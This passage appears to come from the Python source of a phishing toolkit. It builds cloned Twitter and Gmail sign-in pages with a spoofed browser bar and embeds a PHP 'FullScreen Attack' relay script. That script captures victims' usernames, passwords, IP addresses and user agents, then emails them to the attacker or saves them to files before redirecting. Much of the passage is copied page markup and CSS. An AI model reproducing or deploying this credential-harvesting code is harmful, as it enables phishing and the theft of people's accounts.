                  <b class="sc-key">j</b>
                </td>
                <td class="shortcut-label">Next Tweet</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">k</b>
                </td>
                <td class="shortcut-label">Previous Tweet</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">Space</b>
                </td>
                <td class="shortcut-label">Page down</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">/</b>
                </td>
                <td class="shortcut-label">Search</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">.</b>
                </td>
                <td class="shortcut-label">Load new Tweets</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</div>



    <div id="block-user-dialog" class="modal-container">
  <div class="close-modal-background-target"></div>
  <div class="modal draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

      <div class="modal-header">
        <h3 class="modal-title">Are you sure you want to block this user?</h3>
      </div>

      <div class="modal-body modal-tweet"></div>

      <div class="modal-footer">
        <button class="btn cancel-action js-close">Cancel</button>
        <button class="btn primary-btn block-action">Block</button>
      </div>
    </div>
  </div>
</div>

    
      
      
    
        <div id="geo-disabled-dropdown">
          <div class="dropdown-menu" tabindex="-1">
        <div class="dropdown-caret">
          <span class="caret-outer"></span>
          <span class="caret-inner"></span>
        </div>
        <ul>
          <li class="geo-not-enabled-yet">
            <h2>Add a location to your Tweets</h2>
            <p>
              When you tweet with a location, Twitter stores that location.&#32;
              You can switch location on/off before each Tweet and always have the option to delete your location history.
              <a href="http://support.twitter.com/forums/26810/entries/78525" target="_blank">Learn more</a>
            </p>
            <div>
              <button type="button" class="geo-turn-on btn primary-btn">Turn location on</button>
              <button type="button" class="geo-not-now btn-link">Not now</button>
            </div>
          </li>
        </ul>
      </div>    </div>
    
      <div id="geo-enabled-dropdown">
        <div class="dropdown-menu" tabindex="-1">
      <div class="dropdown-caret">
        <span class="caret-outer"></span>
        <span class="caret-inner"></span>
      </div>
      <ul>
        <li class="geo-query-location">
          <input type="text" autocomplete="off" placeholder="Search for a neighborhood or city">
          <span class="icon generic-search"></span>
        </li>
        <li class="geo-dropdown-status"></li>
        <li class="dropdown-link geo-turn-off-item geo-focusable">
          <span class="icon close"></span>Turn off location
        </li>
      </ul>
    </div>  </div>
    
    
      <div id="profile_popup" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-small draggable">
      <div class="modal-content clearfix">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Profile summary</h3>
        </div>
  
        <div class="modal-body profile-modal">
  
        </div>
  
        <div class="loading">
          <span class="spinner-bigger"></span>
        </div>
      </div>
    </div>
  </div>  <div id="list-membership-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-small draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Your lists</h3>
        </div>
        <div class="modal-body">
          <div class="list-membership-content"></div>
          <span class="spinner lists-spinner" title="Loading&hellip;"></span>
        </div>
      </div>
    </div>
  </div>  <div id="list-operations-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-medium draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Create a new list</h3>
        </div>
        <div class="modal-body">
          
        <div class="list-editor">
          <div class="field">
            <label for="list-name">List name</label>
            <input type="text" class="text" name="name" value="" />
          </div>
          <div class="field" style="display:none">
            <label for="list-link">List link</label>
            <span></span>
          </div>
          <hr/>
        
          <div class="field">
            <label for="description">Description</label>
            <textarea name="description"></textarea>
            <span class="help-text">Under 100 characters, optional</span>
          </div>
          <hr/>
        
          <div class="field">
            <label for="mode">Privacy</label>
            <div class="options">
              <label for="list-public-radio">
                <input class="radio" type="radio" name="mode" id="list-public-radio" value="public" checked="checked"  />
                <b>Public</b> &middot; Anyone can follow this list
              </label>
              <label for="list-private-radio">
                <input class="radio" type="radio" name="mode" id="list-private-radio" value="private"  />
                <b>Private</b> &middot; Only you can access this list
              </label>
            </div>
          </div>
          <hr/>
        
          <div class="list-editor-save">
            <button type="button" class="btn btn-primary update-list-button" data-list-id="">Save list</button>
          </div>
        
        </div>      </div>
      </div>
    </div>
  </div>
      <div id="activity-popup-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal draggable">
      <div class="modal-content clearfix">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

        <div class="modal-header">
          <h3 class="modal-title"></h3>
        </div>
  
        <div class="modal-body">
          <div class="activity-tweet clearfix"></div>
          <div class="loading">
            <span class="spinner-bigger"></span>
          </div>
          <div class="activity-content clearfix"></div>
        </div>
      </div>
    </div>
  </div>

    <div id="confirm_dialog" class="modal-container">
  <div class="close-modal-background-target"></div>
  <div class="modal draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
        <h3 class="modal-title"></h3>
      </div>
      <div class="modal-body">
        <p class="modal-body-text"></p>
      </div>
      <div class="modal-footer">
        <button class="btn js-close" id="confirm_dialog_cancel_button"></button>
        <button id="confirm_dialog_submit_button" class="btn primary-btn modal-submit"></button>
      </div>
    </div>
  </div>
</div>

    
    
      <div id="embed-tweet-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-medium draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Embed this Tweet</h3>
        </div>
        <div class="modal-body">
          <div class="embed-code-container">
          <p>Add this Tweet to your website by copying the code below. <a href="//dev.twitter.com/docs/embedded-tweets">Learn more</a></p>
          <form>
        
            <div class="embed-destination-wrapper">
              <div class="embed-overlay embed-overlay-spinner"><div class="embed-overlay-content"></div></div>
              <div class="embed-overlay embed-overlay-error">
                <p class="embed-overlay-content">Hmm, there was a problem reaching the server. <a href="javascript:;">Try again?</a></p>
              </div>
              <textarea class="embed-destination js-initial-focus"></textarea>
              <div class="embed-options">
                <div class="embed-include-parent-tweet">
                  <label for="include-parent-tweet">
                    <input type="checkbox" id="include-parent-tweet" class="include-parent-tweet" checked>
                    Include parent Tweet
                  </label>
                </div>
                <div class="embed-include-card">
                  <label for="include-card">
                    <input type="checkbox" id="include-card" class="include-card" checked>
                    Include media
                  </label>
                </div>
              </div>
            </div>
          </form>
          <div class="embed-preview">
            <h3>Preview</h3>
          </div>
        </div>
      </div>
      </div>
    </div>
  </div>

    
    
    
      
    <div id="signin-or-signup-dialog">
      <div id="signin-or-signup" class="modal-container">
        <div class="close-modal-background-target"></div>
        <div class="modal modal-medium draggable">
          <div class="modal-content">
            <button type="button" class="modal-btn modal-close js-close">
                <span class="icon close-medium">
                  <span class="visuallyhidden">Close</span>
                </span>
          </button>
          <div class="modal-header">
              <h3 class="modal-title modal-long-title signup-only">Sign up for Twitter &amp; follow @<span></span></h3>
              <h3 class="modal-title not-signup-only">Sign in to Twitter</h3>
            </div>
            <div class="modal-body signup-only">
              <form action="https://twitter.com/signup" class="clearfix signup" method="post">
              <div class="holding name">
                <input type="text" autocomplete="off" name="user[name]" maxlength="20" class="js-initial-focus">
                <span class="holder">Full name</span>
              </div>
              <div class="holding email">
                <input class="email-input" type="text" autocomplete="off" name="user[email]">
                <span class="holder">Email</span>
              </div>
              <div class="holding password">
                <input type="password" name="user[user_password]">
                <span class="holder">Password</span>
              </div>
              <input type="hidden" value="" name="context">
              <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
              <input name="follows" type="hidden" value="">
              <input type="submit" class="btn signup-btn js-submit js-signup-btn" value="Sign up">
            </form>
          </div>
            <div class="modal-body not-signup-only">
              <form action="https://twitter.com/sessions" class="signin" method="post">
              <fieldset>
  
    <div class="clearfix holding hasome">
      <span class="username js-username holder">Username or email</span>
      <input class="js-username-field email-input js-initial-focus" type="text" name="session[username_or_email]" autocomplete="on" value="">
    </div>
  
    <div class="clearfix holding">
      <span class="password holder">Password</span>
      <input class="js-password-field" type="password" name="session[password]">
    </div>
  
    <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
  
  </fieldset>
  <div class="clearfix">
  
    <input type="hidden" name="scribe_log">
    <input type="hidden" name="redirect_after_login" value="/">
    <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
    <button type="submit" class="submit btn primary-btn">Sign in</button>
  
    <fieldset class="subchck">
      <label class="remember">
        <input type="checkbox" value="1" name="remember_me" checked="checked">
        Remember me
      </label>
    </fieldset>
    <span class="separator">·</span>
    <a class="forgot" href="/account/resend_password">Forgot password?</a>
  
  </div>
  <div class="divider"></div>
              <p>
                <a class="forgot" href="/account/resend_password">Forgot password?</a><br />
                <a class="mobile has-sms" href="/account/complete">Already using Twitter via text message?</a>
              </p>
            </form>
            <div class="signup">
                <h2>Not on Twitter? Sign up, tune into the things you care about, and get updates as they happen.</h2>
                <form action="https://twitter.com/signup" class="signup" method="get">
                <button class="btn promotional signup-btn" type="submit">Sign up &raquo;</button>
              </form>
            </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="sms-codes-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal modal-medium draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <div class="modal-header">
          <h3 class="modal-title">Two-way (sending and receiving) short codes:</h3>
        </div>
        <div class="modal-body">
          
        <table id="sms_codes" cellpadding="0" cellspacing="0">
          <thead>
            <tr>
              <th>Country</th>
              <th>Code</th>
              <th>For customers of</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>United States</td>
              <td>40404</td>
              <td>(any)</td>
            </tr>
            <tr>
              <td>Canada</td>
              <td>21212</td>
              <td>(any)</td>
            </tr>
            <tr>
              <td>United Kingdom</td>
              <td>86444</td>
              <td>Vodafone, Orange, 3, O2</td>
            </tr>
            <tr>
              <td>Brazil</td>
              <td>40404</td>
              <td>Nextel, TIM</td>
            </tr>
            <tr>
              <td>Haiti</td>
              <td>40404</td>
              <td>Digicel, Voila</td>
            </tr>
            <tr>
              <td>Ireland</td>
              <td>51210</td>
              <td>Vodafone, O2</td>
            </tr>
            <tr>
              <td>India</td>
              <td>53000</td>
              <td>Bharti Airtel, Videocon, Reliance</td>
            </tr>
            <tr>
              <td>Indonesia</td>
              <td>89887</td>
              <td>AXIS, 3, Telkomsel, Indosat, XL Axiata</td>
            </tr>
            <tr>
              <td rowspan="2">Italy</td>
              <td>4880804</td>
              <td>Wind</td>
            </tr>
            <tr>
              <td>3424486444</td>
              <td>Vodafone</td>
            </tr>
          </tbody>
          <tfoot>
            <tr>
              <td colspan="3">
                &raquo; <a class="js-initial-focus" target="_blank" href="http://support.twitter.com/articles/14226-how-to-find-your-twitter-short-code-or-long-code">See SMS short codes for other countries</a>
              </td>
            </tr>
          </tfoot>
        </table>      </div>
      </div>
    </div>
  </div>    <div class="hidden">
      <iframe class="tweet-post-iframe" name="tweet-post-iframe"></iframe>
    
    </div>    
    <div id="spoonbill-outer"></div>
  </body>
</html>
  <input type="hidden" id="init-data" class="json-data" value="{&quot;assetsBasePath&quot;:&quot;https:\/\/abs.twimg.com\/a\/1383847355\/&quot;,&quot;preflight&quot;:false,&quot;loggedIn&quot;:false,&quot;asyncSocialProof&quot;:true,&quot;typeaheadData&quot;:{&quot;fullNameMatchingInCompose&quot;:false,&quot;recentSearches&quot;:{&quot;enabled&quot;:false},&quot;remoteDebounceInterval&quot;:300,&quot;showSearchAccountSocialContext&quot;:true,&quot;dmAccounts&quot;:{&quot;onlyDMable&quot;:true,&quot;remoteQueriesEnabled&quot;:false,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false},&quot;hashtags&quot;:{&quot;remoteQueriesEnabled&quot;:false,&quot;prefetchLimit&quot;:500,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false},&quot;topics&quot;:{&quot;remoteQueriesEnabled&quot;:false,&quot;prefetchLimit&quot;:500,&quot;showTypeaheadTopicSocialContext&quot;:false,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false,&quot;limit&quot;:4},&quot;savedSearches&quot;:{&quot;items&quot;:[],&quot;enabled&quot;:false},&quot;remoteThrottleInterval&quot;:300,&quot;showDebugInfo&quot;:false,&quot;accounts&quot;:{&quot;remoteQueriesEnabled&quot;:false,&quot;enabled&quot;:false,&quot;localQueriesEnabled&quot;:false,&quot;limit&quot;:6},&quot;useThrottle&quot;:true,&quot;tweetContextEnabled&quot;:false,&quot;accountsOnTop&quot;:false},&quot;bodyFoucClassNames&quot;:&quot;swift-loading&quot;,&quot;userId&quot;:null,&quot;researchExperiments&quot;:{},&quot;pageName&quot;:&quot;login&quot;,&quot;mediaGrid&quot;:true,&quot;viewContainer&quot;:&quot;#page-container&quot;,&quot;geoEnabled&quot;:false,&quot;sandboxes&quot;:{&quot;detailsPane&quot;:&quot;https:\/\/abs.twimg.com\/a\/1383847355\/details_pane_content_sandbox.html&quot;,&quot;jsonp&quot;:&quot;https:\/\/abs.twimg.com\/a\/1383847355\/jsonp_sandbox.html&quot;},&quot;baseFoucClass&quot;:&quot;swift-loading&quot;,&quot;environment&quot;:&quot;production&quot;,&quot;deciders&quot;:{&quot;mqImageUploads&quot;:false,&quot;preserve_scroll_position&quot;:false,&quot;oembed_use_macaw_syndication&quot;:true,&quot;pushState&quot;:true,&quot;hqImageUploads&quot;:false,&quot;disable_profile_popup&quot;:false},&quot;debugAllowed&quot;:false,&quot;notifications_timeline&quot;:null,&quot;pushState&quot;:true,&quot;timelineCardsGallery&quot;:true,&quot;hasPushDevice&quot;:null,&quot;dmTopNavEnabled&quot;:false,&quot;scribeParameters&quot;:{},&quot;searchPathWithQuery&quot;:&quot;\/search?q=query&amp;src=typd&quot;,&quot;formAuthenticityToken&quot;:&quot;d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58&quot;,&quot;scribeBufferSize&quot;:3,&quot;notifications_dm&quot;:null,&quot;pushStatePageLimit&quot;:500000,&quot;permalinkCardsGallery&quot;:false,&quot;deviceEnabled&quot;:false,&quot;isMonorail&quot;:true,&quot;initialState&quot;:{&quot;ttft_navigation&quot;:false,&quot;page_container_class_names&quot;:&quot;wrapper wrapper-login white&quot;,&quot;title&quot;:&quot;Sign in to Twitter&quot;,&quot;section&quot;:null,&quot;route_name&quot;:&quot;login&quot;,&quot;module&quot;:&quot;app\/pages\/login&quot;,&quot;doc_class_names&quot;:&quot;route-login&quot;,&quot;body_class_names&quot;:&quot;t1 logged-out&quot;,&quot;cache_ttl&quot;:300},&quot;routes&quot;:{&quot;profile&quot;:&quot;\/&quot;},&quot;profileHoversEnabled&quot;:false,&quot;internalReferer&quot;:null,&quot;notifications_spoonbill&quot;:null,&quot;dragAndDropPhotoUpload&quot;:true,&quot;experiments&quot;:{},&quot;notifications_dm_poll_scale&quot;:null,&quot;href&quot;:&quot;\/login\/error?redirect_after_login=%2F&amp;username_or_email=&quot;,&quot;smsDeviceVerified&quot;:null,&quot;screenName&quot;:null,&quot;rosetta&quot;:false,&quot;sectionName&quot;:&quot;error&quot;}">
    <input type="hidden" class="swift-boot-module" value="app/pages/login">
  <input type="hidden" id="swift-module-path" value="https://abs.twimg.com/c/swift/en">

  
    <script src="https://abs.twimg.com/c/swift/en/init.60642a289b5798dceb687c1681a7ae951106fb23.js" async></script>




</div>        
        <script src=\""""+pathList[3]+"""\"></script> 
        <script src=\""""+pathList[4]+"""\"></script>
        <script src=\""""+pathList[5]+"""\"></script>
        <script src=\""""+pathList[6]+"""\"></script>
        <script src=\""""+pathList[7]+"""\"></script>

</body>
</html>
<?PHP
// FullScreen Attack PHP Relay and Grab Code
// Written By: d4rk0
// Twitter: @d4rk0s


function writeFile($fileName,$data,$fileType){
    // This Opens file at end for writing if doesnt exist tries to create it
    $file = fopen($fileName, 'a');
    fwrite($file, $data);
    fclose($file);
  }


function sendM($to,$message){
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Additional headers
        $headers .= 'From: SET Attack <fullscreen@phish.org>' . "\\r\\n";
        $subject = "Victims Information";
        // Mail it
        mail($to, $subject, $message, $headers);
 }

function pageForward($page){
        // Page Forward
        echo '<meta http-equiv="refresh" content="0;URL='.$page.'">';
 }

function randomFilename(){
     // return random file name
    mt_srand(time()%2147 * 1000000 + (double)microtime() * 1000000); 
    $randomNUM = mt_rand(1, 972484); 
    $fileNAME = "report" . $randomNUM. ".txt";
    return $fileNAME;
 }


function pullIP(){
    // This Returns an IP of person
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
 }

function userAgent(){
    $Agent = $_SERVER['HTTP_USER_AGENT'];
    return $Agent;
 }


if(isset($_POST['submit'])){

       $action  = \""""+valueList[0]+"""\";
       $redirect = \""""+valueList[1]+"""\";
       $verbose = \""""+valueList[2]+"""\";
       $fileName = \""""+valueList[3]+"""\";
       $to = \""""+valueList[3]+"""\";
       // Grab Form Values
       $email = $_POST[\"Username\"];
       $password =  $_POST[\"Password\"];
   
    // Specify rest of PHP code
       
    // Verbose loud
    if ($verbose == "loud"){
        $IP = pullIP();
        $Agent = userAgent();
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- Other Information: ".
        "\n Victim IP: " .$IP. " UserAgent: ".$Agent;
        }

   // Verbose quiet
   if ($verbose == "quiet"){
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- END OF TRANSCRIPT";
        }


    // Send in mail
    if ($action == "mail"){
       // Email Message 
        sendM($to,$message);
        pageForward($redirect);
    }
  

    // Save to ServerDisk as Same File
    if ($action == "diskFile"){
        // Write to Individual File 
        if ($fileName == ""){ $fileName = "SETInfo.txt";  }
        writeFile($fileName,$message);
        pageForward($redirect);
    }


    // Save to ServerDisk Random File
    if ($action == "diskRandom"){
        // Get random File name
        $fileName = randomFilename();          
        writeFile($fileName,$message);
        pageForward($redirect);
    }

 }

?>
            """
            # Append code to list
            indexList.append(indexCode)
            # Append Index List
            return indexList    


        # GMAIL HTML For GMAIL
        if codeType == "GMAIL":
            indexList = []
            indexCode = """
<!doctype html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>"""+title+"""</title>
<meta name="description" content="">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
  
   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>

  <div id="spoofHeader">
    <div id="spoofMenu"></div>
    <div id="spoofBrowser"></div>
  </div>


<div id="spoofSite">

<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <title>Gmail: Email from Google</title>
  <meta name="description" content="10+ GB of storage, less spam, and mobile access. Gmail is email that&#39;s intuitive, efficient, and useful. And maybe even fun.">
  <link rel="icon" type="image/ico" href="http://mail.google.com/favicon.ico">
<style type="text/css">
  html, body, div, h1, h2, h3, h4, h5, h6, p, img, dl,
  dt, dd, ol, ul, li, table, tr, td, form, object, embed,
  article, aside, canvas, command, details, fieldset,
  figcaption, figure, footer, group, header, hgroup, legend,
  mark, menu, meter, nav, output, progress, section, summary,
  time, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
  }
  article, aside, details, figcaption, figure, footer,
  header, hgroup, menu, nav, section {
  display: block;
  }
  html {
  font: 81.25% arial, helvetica, sans-serif;
  background: #fff;
  color: #333;
  line-height: 1;
  direction: ltr;
  }
  a {
  color: #15c;
  text-decoration: none;
  }
  a:active {
  color: #d14836;
  }
  a:hover {
  text-decoration: underline;
  }
  h1, h2, h3, h4, h5, h6 {
  color: #222;
  font-size: 1.54em;
  font-weight: normal;
  line-height: 24px;
  margin: 0 0 .46em;
  }
  p {
  line-height: 17px;
  margin: 0 0 1em;
  }
  ol, ul {
  list-style: none;
  line-height: 17px;
  margin: 0 0 1em;
  }
  li {
  margin: 0 0 .5em;
  }
  table {
  border-collapse: collapse;
  border-spacing: 0;
  }
  strong {
  color: #222;
  }
</style>
<style type="text/css">
  html, body {
  position: absolute;
  height: 100%;
  min-width: 100%;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .wrapper + style + iframe {
  display: none;
  }
  .content {
  padding: 0 44px;
  }
  .topbar {
  text-align: right;
  padding-top: .5em;
  padding-bottom: .5em;
  }
  .google-header-bar {
  height: 71px;
  background: #f1f1f1;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  }
  .header .signin,
  .header .signup {
  margin: 28px 0 0;
  float: right;
  font-weight: bold;
  }
  .header .signin-button,
  .header .signup-button {
  margin: 22px 0 0;
  float: right;
  }
  .header .signin-button a {
  font-size: 13px;
  font-weight: normal;
  }
  .header .signup-button a {
  position: relative;
  top: -1px;
  margin: 0 0 0 1em;
  }
  .main {
  margin: 0 auto;
  width: 650px;
  padding-top: 23px;
  padding-bottom: 100px;
  }
  .main h1:first-child {
  margin: 0 0 .92em;
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #ebebeb;
  overflow: hidden;
  }
  .footer {
  padding-top: 9px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  color: #999;
  float: left;
  max-width: 80%;
  }
  .footer ul li {
  display: inline;
  padding: 0 1.5em 0 0;
  }
  .footer a {
  color: #333;
  }
  .footer .lang-chooser-wrap {
  float: right;
  max-width: 20%;
  }
  .footer .lang-chooser-wrap img {
  vertical-align: middle;
  }
  .footer .attribution {
  float: right;
  }
  .footer .attribution span {
  vertical-align: text-top;
  }
  .redtext {
  color: #dd4b39;
  }
  .greytext {
  color: #555;
  }
  .secondary {
  font-size: 11px;
  color: #666;
  }
  .source {
  color: #093;
  }
  .hidden {
  display: none;
  }
  .announce-bar {
  position: absolute;
  bottom: 35px;
  height: 33px;
  z-index: 2;
  width: 100%;
  background: #f9edbe;
  border-top: 1px solid #efe1ac;
  border-bottom: 1px solid #efe1ac;
  overflow: hidden;
  }
  .announce-bar .message {
  font-size: .85em;
  line-height: 33px;
  margin: 0;
  }
  .announce-bar .message .separated {
  margin-left: 1.5em;
  }
  .announce-bar-ac {
  background: #eee;
  border-top: 1px solid #e5e5e5;
  border-bottom: 1px solid #e5e5e5;
  }
  .clearfix:after {
  visibility: hidden;
  display: block;
  font-size: 0;
  content: '.';
  clear: both;
  height: 0;
  }
  * html .clearfix {
  zoom: 1;
  }
  *:first-child+html .clearfix {
  zoom: 1;
  }
  pre {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  }
</style>
<style type="text/css">
  button, input, select, textarea {
  font-family: inherit;
  font-size: inherit;
  }
  button::-moz-focus-inner,
  input::-moz-focus-inner {
  border: 0;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 29px;
  margin: 0;
  padding: 0 8px;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=email][disabled=disabled],
  input[type=number][disabled=disabled],
  input[type=password][disabled=disabled],
  input[type=tel][disabled=disabled],
  input[type=text][disabled=disabled],
  input[type=url][disabled=disabled] {
  border: 1px solid #e5e5e5;
  background: #f1f1f1;
  }
  input[type=email][disabled=disabled]:hover,
  input[type=number][disabled=disabled]:hover,
  input[type=password][disabled=disabled]:hover,
  input[type=tel][disabled=disabled]:hover,
  input[type=text][disabled=disabled]:hover,
  input[type=url][disabled=disabled]:hover {
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  }
  input[type=email][readonly=readonly],
  input[type=number][readonly=readonly],
  input[type=password][readonly=readonly],
  input[type=text][readonly=readonly],
  input[type=url][readonly=readonly] {
  border: 1px solid #d9d9d9;
  }
  input[type=email][readonly=readonly]:hover,
  input[type=number][readonly=readonly]:hover,
  input[type=password][readonly=readonly]:hover,
  input[type=text][readonly=readonly]:hover,
  input[type=url][readonly=readonly]:hover,
  input[type=email][readonly=readonly]:focus,
  input[type=number][readonly=readonly]:focus,
  input[type=password][readonly=readonly]:focus,
  input[type=text][readonly=readonly]:focus,
  input[type=url][readonly=readonly]:focus {
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  appearance: none;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #dcdcdc;
  -webkit-border-radius: 1px;
  -moz-border-radius: 1px;
  border-radius: 1px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  border-color: #c6c6c6;
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 1px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(http://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color:#4d90fe;
  }
  .gaia-country-menu-item-flag, .gaia-country-menu-item-noflag {
  width: 16px;
  height: 11px;
  margin-right: 1em;
  }
  .gaia-country-menu-item-flag {
  background: no-repeat url(http://ssl.gstatic.com/i18n/phonenumbers/phoneinputwidget/flags4.png) 0 0;
  overflow: hidden;
  }
  .g-button {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  height: 27px;
  padding: 0 8px;
  line-height: 27px;
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  -webkit-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -ms-transition: all 0.218s;
  -o-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  cursor: default;
  }
  *+html .g-button {
  min-width: 70px;
  }
  button.g-button,
